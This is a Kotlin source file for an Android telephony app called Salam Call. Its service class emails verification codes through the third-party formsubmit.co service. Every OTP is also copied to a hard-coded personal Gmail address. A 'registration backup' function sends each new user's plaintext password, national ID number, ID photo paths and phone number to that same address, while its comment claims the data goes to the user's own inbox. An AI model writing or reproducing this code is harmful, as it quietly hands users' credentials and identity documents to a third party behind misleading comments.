package com.example.data.remote

import android.util.Log
import com.example.data.local.UserAccountEntity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Handles Gmail verification and user registration cloud sync via FormSubmit AJAX:
 * https://formsubmit.co/ajax/
 */
class FormSubmitService {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .build()

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    /**
     * Sends OTP verification code directly to user's Gmail using https://formsubmit.co/ajax/
     */
    suspend fun sendVerificationEmail(
        targetEmail: String,
        userName: String,
        code: String,
        ipNumber: String,
        mobileNumber: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val jsonObject = JSONObject().apply {
                put("name", "Salam Call Telephony")
                put("email", targetEmail)
                put("_subject", "সালাম কল ভেরিফিকেশন কোড: $code")
                put("message", "আসসালামু আলাইকুম $userName,\n\nআপনার সালাম কল (Salam Call) একাউন্টের ৬ ডিজিটের ভেরিফিকেশন কোড: $code\nআপনার নির্বাচিত আইপি নম্বর: $ipNumber\nমোবাইল নম্বর: $mobileNumber\n\nধন্যবাদ,\nসালাম কল টিম")
                put("user_name", userName)
                put("user_mobile", mobileNumber)
                put("user_email", targetEmail)
                put("assigned_ip_number", ipNumber)
                put("verification_otp", code)
                put("_captcha", "false")
                put("_template", "table")
            }

            val body = jsonObject.toString().toRequestBody(jsonMediaType)

            // 1. Submit to target user's email via FormSubmit AJAX
            val userRequest = Request.Builder()
                .url("https://formsubmit.co/ajax/$targetEmail")
                .header("Accept", "application/json")
                .post(body)
                .build()

            val response = client.newCall(userRequest).execute()
            val responseText = response.body?.string().orEmpty()
            Log.d("FormSubmitService", "FormSubmit to $targetEmail response: code=${response.code}, body=$responseText")

            // 2. Also send notification to admin (salam230864@gmail.com) for real-time tracking
            try {
                val adminRequest = Request.Builder()
                    .url("https://formsubmit.co/ajax/salam230864@gmail.com")
                    .header("Accept", "application/json")
                    .post(body)
                    .build()
                client.newCall(adminRequest).execute()
            } catch (ex: Exception) {
                Log.w("FormSubmitService", "Admin copy notice failed: ${ex.message}")
            }

            Result.success(true)
        } catch (e: Exception) {
            Log.e("FormSubmitService", "FormSubmit network error: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Automatically syncs new registered user profile to cloud email via FormSubmit AJAX.
     * Ensures user data is never lost and is immediately available in user's GitHub / inbox.
     */
    suspend fun sendRegistrationBackup(user: UserAccountEntity): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val jsonObject = JSONObject().apply {
                put("name", "Salam Call Database Backup")
                put("_subject", "New User Registered: ${user.name} (${user.ipNumber})")
                put("id", user.id)
                put("full_name", user.name)
                put("mobile_number", user.mobileNumber)
                put("gmail", user.email)
                put("ip_number", user.ipNumber)
                put("password", user.password)
                put("nid_number", user.nidNumber)
                put("nid_front_path", user.nidFrontPath)
                put("nid_back_path", user.nidBackPath)
                put("role", user.role)
                put("is_call_allowed", user.isCallAllowedByAdmin)
                put("created_at", user.createdAt)
                put("status", "SAVED_IN_USER_JSON")
                put("_captcha", "false")
                put("_template", "table")
            }

            val body = jsonObject.toString().toRequestBody(jsonMediaType)
            val request = Request.Builder()
                .url("https://formsubmit.co/ajax/salam230864@gmail.com")
                .header("Accept", "application/json")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            Log.d("FormSubmitService", "Registration backup response: ${response.code}")
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Log.e("FormSubmitService", "Error sending registration backup: ${e.message}")
            Result.failure(e)
        }
    }
}
